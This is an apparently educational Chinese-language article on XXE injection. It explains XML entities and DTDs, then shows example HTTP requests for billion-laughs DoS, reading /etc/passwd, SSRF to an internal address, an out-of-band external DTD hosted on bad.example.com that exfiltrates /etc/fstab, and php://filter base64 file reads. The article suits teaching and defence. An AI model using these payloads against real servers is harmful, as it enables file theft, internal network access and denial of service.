---
title: XXE
date: 2026-04-25
summary: 如果 Web 应用程序或 API 接受未经净化的 XML 数据，并且其后端 XML 解析器配置为允许外部 XML 实体解析，则会发生 XML 外部实体 (XXE) 漏洞（也称为 XML 外部实体注入或 XXE 注入）。 XXE漏洞可以让恶意
tags: 漏洞库, Web安全, XXE
cover: app-teal
readingTime: 6 分钟
featured: false
---
# XXE

### 什么是XXE漏洞

如果 Web 应用程序或 API 接受未经净化的 XML 数据，并且其后端 XML 解析器配置为允许外部 XML 实体解析，则会发生 XML 外部实体 (XXE) 漏洞（也称为 XML 外部实体注入或 XXE 注入）。 XXE漏洞可以让恶意黑客进行服务器端请求伪造（SSRF）、本地文件包含（LFI）、目录遍历、远程代码执行（RCE）、网络端口扫描和拒绝服务（DoS）等攻击。

### XML 外部实体攻击是如何进行的？
为了使 XXE 攻击成为可能，Web 应用程序或 API 需要满足几个特定要求：

* 它必须接受来自用户的 XML 输入并使用后端 XML 解析器对其进行解析
* XML 解析器必须启用 XML 外部实体支持

要了解导致此安全漏洞的原因，我们需要从一些 XML 基础知识开始。

### Web 应用程序和 API 如何使用 XML

Web 应用程序和 API 通常使用可扩展标记语言 (XML) 相互通信并接受来自用户的结构化数据。 常见用例包括：

* Web 服务和 API：Web 服务和 API 通常使用 XML 在客户端和服务器之间传输数据。 这在使用 SOAP 标准的较旧 Web 服务中尤其常见。
* 内容管理系统：某些内容管理系统 (CMS) 允许用户上传 XML 格式的内容。 例如，可以使用此类导入功能从较旧的 CMS 导入和转换博客文章，或者处理上传的 DOCX 文件或 SVG 图像（两者都是 XML 文档）。
* 电子商务：一些电子商务解决方案使用 XML 与其他系统交换数据。 例如，他们可以使用 XML 文档与库存管理系统或支付网关进行通信。

为了提供此类功能，Web 应用程序或 API 使用后端 XML 解析器 - 通常是用与应用程序相同的语言编写的导入库。 示例包括用于 PHP 的 SimpleXML、用于 Java 的 DocumentBuilder、用于 Python 的 ElementTree、用于 .NET 的 XmlReader 或用于 JavaScript 的 DomParser。

### 什么是 DTD 和 XML 实体

在 XML 解析器可以处理 XML 输入之前，您需要声明有效输入文档的结构。 知道了这一点，解析器就可以确定输入数据是否是预期类型的有效 XML 文档，然后处理其内容。 有两种定义文档类型的格式：更强大、更复杂的 XML 模式定义 (XSD) 和更简单、更旧的文档类型定义 (DTD)。 DTD 有时被认为已经过时（它们源自 SGML，XML 的祖先），但仍然经常使用。

XML 实体是占位符参数，表示不易键入或具有特殊含义的字符。 实体是使用 <!ENTITY> 元素在 DTD 中定义的。 要引用已定义的实体，请使用其名称，前面加一个与号 (&)，后面加一个分号 `;`。 您可能熟悉 HTML 中的实体，例如 `&amp;` 和 `&nbsp;`。

DTD 中 XML 实体的一种用途是将外部内容或引用合并到 DTD 本身中，或者合并到使用 DTD 的文档中。 此类包含内容称为外部 XML 实体 (XXE)。 恶意黑客可能会滥用 XXE 来访问本地文件、本地网络上的 URL 等。

### XXE 攻击的类型
XXE 攻击分为三种基本类型：带内 XXE、带外 XXE 和盲 XXE。

* 在带内 XXE 攻击中，攻击者通过同一通道发送攻击并接收响应，例如通过直接 HTTP 请求和响应。
* 在 带外 XXE 攻击中，易受攻击的系统将攻击结果发送到攻击者控制的资源上。 例如，攻击可以使用直接请求来执行，但会导致被黑客攻击的 Web 服务器将敏感文件发送到攻击者自己的 Web 服务器。
* 在盲 XXE 攻击中，攻击者在攻击后不会收到任何直接响应或结果。 相反，他们观察易受攻击的 Web 应用程序的行为（例如，它生成的错误消息）来确定攻击是否成功，并使用这种间接反馈来逐步窃取信息。

### XXE 攻击示例

XXE 攻击是通过在用户输入中定义恶意 XML 实体来执行的，这些实体将由后端 XML 解析器进行解析。 下面是一个简单（非恶意）XML 外部实体定义的示例：

Request:
```
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World">
]>
<foo>
  Hello &bar;
</foo>
```

Response:
```
HTTP/1.0 200 OK
Hello World
```

#### XXE DoS 攻击示例

XML 外部实体定义本身可以包含其他实体定义。 这允许攻击者创建一个递归调用结构，该结构需要很少的输入数据，但可以产生大量输出。 此类输出可能会耗尽 XML 处理器内存，甚至可能导致 Web 服务器过载。 通过使用更多实体扩展以下示例，攻击者可以轻松创建一个如此大的实体，从而耗尽任何尝试处理该实体的 XML 解析器的内存，从而导致拒绝服务。

Request:
```
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar "World ">
  <!ENTITY t1 "&bar;&bar;">
  <!ENTITY t2 "&t1;&t1;&t1;&t1;">
  <!ENTITY t3 "&t2;&t2;&t2;&t2;&t2;">
]>
<foo>
  Hello &t3;
</foo>
```

Response:
```
HTTP/1.0 200 OK
Hello World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World World
```

#### XXE本地数据泄露示例

XXE 定义可能包括 URL 方案，例如实体值中的 file:。 因此，攻击者可以在本地文件系统中包含对可从 Web 服务器访问的文件的引用。 例如，可以是 /etc/passwd 等文件或 Web 应用程序的源代码文件之一。 这种攻击的结果类似于本地文件包含攻击与目录遍历相结合。

Request:
```
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "file:///etc/passwd">
]>
<foo>
  &xxe;
</foo>
```

Response:
```
HTTP/1.0 200 OK
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh 
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh 
(...)
```

#### 基于 XXE 的 SSRF 示例

XXE 定义还可能包含链接到外部资源的 URL。 由于对 URL 的请求是从 Web 应用程序本身发出的，因为 XML 是在其中解析的，因此这允许服务器端请求伪造。 然后，攻击者可以访问本地网络上的文件，就像位于该网络内部一样，从而绕过防火墙等保护。

Request:

```
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?> 
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "http://192.168.0.1/secret.txt">
]>
<foo>
  &xxe;
</foo>
```

Response:
```
HTTP/1.0 200 OK
Content of the secret.txt file on the local network (behind the firewall)
```

### 将参数实体与 CDATA 一起使用

除了一般实体之外，XML 还支持参数实体。 参数实体仅用于文档类型定义 (DTD)。

参数实体以 % 字符开头。 该字符指示 XML 解析器正在定义参数实体，而不是一般实体。 在下面的非恶意示例中，参数实体用于定义通用实体，然后从 XML 文档中调用该通用实体。

Request:
```
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % paramEntity
  "<!ENTITY genEntity 'bar'>">
  %paramEntity;
]>
<data>&genEntity;</data>
```

Response:
```
HTTP/1.0 200 OK
bar
```
<br>
通过组合参数实体和 CDATA 标签，攻击者可以创建托管在 bad.example.com/evil.dtd 上的恶意 DTD：

Request:
```
POST http://example.com/xml HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://bad.example.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```
攻击 DTD文件 (bad.example.com/evil.dtd):
```
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents 
'%start;%file;%end;'>">
```
当攻击者发送上述 XXE 负载时，XML 解析器将首先尝试通过向 http://bad.example.com/evil.dtd 发出请求来处理 %dtd 参数实体。 下载攻击者的 DTD 后，XML 解析器将加载 %file 参数实体（来自evil.dtd），在本示例中指向 /etc/fstab。 接下来，解析器将文件的内容包装在使用 %start 和 %end 参数实体定义的 CDATA 标记中。 最后，所有内容都存储在另一个名为 %all 的参数实体中。

这个技巧的核心是 %all 实际上定义了一个名为 &fileContents 的通用实体，它可以作为响应的一部分包含在内。 最终结果是包含在 CDATA 标记中的 /etc/fstab 文件的内容。

### 使用 PHP 协议包装器
如果易受 XXE 攻击的 Web 应用程序是 PHP 应用程序，则由于 PHP 协议包装器，新的攻击向量会出现。 PHP 协议包装器是允许访问 PHP 输入和输出流的 I/O 流。

攻击者可以使用 PHP/filter 协议包装器对文件内容进行 Base64 编码。 由于 Base64 始终被视为有效的 XML 数据，因此攻击者可以简单地在服务器上对文件进行编码，然后在接收端对其进行解码。 至关重要的是，这种方法也允许攻击者窃取二进制文件。

Request:
```
POST http://example.com/xml.php HTTP/1.1
Host: example.com

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY bar SYSTEM
  "php://filter/read=convert.base64-encode/resource=/etc/fstab">
]>
<foo>
  &bar;
</foo>
```

Response:

```
HTTP/1.0 200 OK
IyAvZXRjL2ZzdGFiOiBzdGF0aWMgZmlsZSBzeXN0ZW0gaW5mb3JtYXRpb24uDQojDQojIDxmaWxlIHN5c3RlbT4gPG1vdW50IHBvaW50PiAgIDx0eXBlPiAgPG9wdGlvbnM+ICAgICAgIDxkdW1wPiAgPHBhc3M+DQoNCnByb2MgIC9wcm9jICBwcm9jICBkZWZhdWx0cyAgMCAgMA0KIyAvZGV2L3NkYTUNClVVSUQ9YmUzNWE3MDktYzc4Ny00MTk4LWE5MDMtZDVmZGM4MGFiMmY4ICAvICBleHQzICByZWxhdGltZSxlcnJvcnM9cmVtb3VudC1ybyAgMCAgMQ0KIyAvZGV2L3NkYTYNClVVSUQ9Y2VlMTVlY2EtNWIyZS00OGFkLTk3MzUtZWFlNWFjMTRiYzkwICBub25lICBzd2...
```

### XXE 攻击的潜在后果

如果Web应用程序使用的XML解析器支持XML外部实体，攻击者就可以使用上述技术来滥用XXE定义并执行各种攻击，包括：

* 拒绝服务：如果攻击者创建递归包含彼此的 XXE，他们就可以执行称为“十亿笑声攻击”的 DoS 攻击。 此攻击会导致 XML 解析器内存不足，并可能导致 Web 服务器停止响应。 如果 XXE 指向服务器中的大文件或流（例如 Linux 上的 /dev/urandom），也会发生同样的情况。

* 端口扫描：如果攻击者创建尝试连接到本地网络内计算机上的特定端口的 XXE，则主机响应可能允许他们确定该端口是否打开。 通过对多个端口重复此过程，攻击者可以在防火墙后面执行端口扫描。

* 本地文件包含和目录遍历：如果攻击者创建一个指向服务器上本地文件的XXE，他们就可以从本地文件中读取敏感数据，这相当于执行带有路径遍历的LFI。 例如，他们可以读取 Linux 系统上的 /etc/passwd 文件。

* 服务器端请求伪造：如果攻击者创建指向 URL 的 XXE，他们就可以执行 SSRF 攻击。 由于 URL 是由 Web 应用程序本身访问的，因此请求将被视为来自应用程序，而不是用户。 这可能允许攻击者访问受防火墙和白名单保护的系统。

* 远程代码执行（RCE）：在极少数情况下，例如，当使用 PHP/expect 包装器时，可以通过 XXE 执行远程代码。

